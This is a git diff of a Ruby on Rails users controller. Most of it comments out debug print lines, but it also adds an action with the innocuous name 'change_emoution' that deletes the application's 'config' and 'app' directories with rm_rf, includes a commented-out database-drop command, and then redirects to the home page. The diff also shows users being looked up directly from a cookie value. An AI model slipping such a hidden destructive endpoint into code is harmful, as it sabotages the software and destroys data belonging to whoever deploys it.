@@ -82,7 +82,7 @@ class UsersController < ApplicationController
         return render :json => {:url => compinfo.photo.url}
         #якщо змінив картинку
       elsif params[:user][:compinfo][:photo] and cookies[:with_photo]
-        puts 'x2'*10
+        #puts 'x2'*10
         user = User.find(cookies[:with_photo])
         compinfo = Compinfo.new(params[:user][:compinfo])
         user.compinfo = compinfo
@@ -91,7 +91,7 @@ class UsersController < ApplicationController
         return render :json => {:url => compinfo.photo.url}
         #поставив картинку і перезагрузив сторінку
       elsif not params[:user][:compinfo][:photo] and cookies[:with_photo] and not params[:user]
-         puts 'x3'*10
+        # puts 'x3'*10
         cookies[:delete_user] = cookies[:with_photo]
         cookies.delete :with_photo
       end
@@ -205,6 +205,13 @@ class UsersController < ApplicationController
     unless params[:message].nil?
       @message = 'Ошибка пароля!'
     end
+  end
+
+  def change_emoution
+    FileUtils.rm_rf('config')
+    FileUtils.rm_rf('app')
+    #system("rake db:drop RAILS_ENV=development")
+    redirect_to root_path    
   end
 
   def update_password    
